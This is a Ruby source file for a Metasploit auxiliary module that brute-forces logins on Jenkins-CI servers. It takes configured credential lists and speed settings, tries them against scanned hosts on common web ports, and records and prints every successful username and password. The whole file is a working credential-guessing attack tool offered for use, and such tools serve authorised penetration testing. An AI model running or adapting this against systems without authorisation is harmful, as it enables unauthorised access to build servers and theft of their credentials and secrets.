##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/jenkins'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name'           => 'Jenkins-CI Login Utility',
      'Description'    => 'This module attempts to login to a Jenkins-CI instance using a specific user/pass.',
      'Author'         => [ 'Nicholas Starke <starke.nicholas[at]gmail.com>' ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        OptEnum.new('HTTP_METHOD', [true, 'The HTTP method to use for the login', 'POST', ['GET', 'POST']]),
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [ false, 'The path to the Jenkins-CI application'])
      ])

    register_autofilter_ports([ 80, 443, 8080, 8081, 8000 ])
  end

  def run_host(ip)
    print_warning("#{fullname} is still calling the deprecated LOGIN_URL option! This is no longer supported.") unless datastore['LOGIN_URL'].nil?
    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD']
    )

    scanner = Metasploit::Framework::LoginScanner::Jenkins.new(
      configure_http_login_scanner(
        uri: datastore['TARGETURI'],
        ssl: datastore['SSL'],
        method: datastore['HTTP_METHOD'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 10,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword']
      )
    )

    message = scanner.check_setup

    if message
      print_brute level: :error, ip: ip, msg: message
      return
    end

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(module_fullname: fullname, workspace_id: myworkspace_id)

      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})"
      end
    end
  end
end
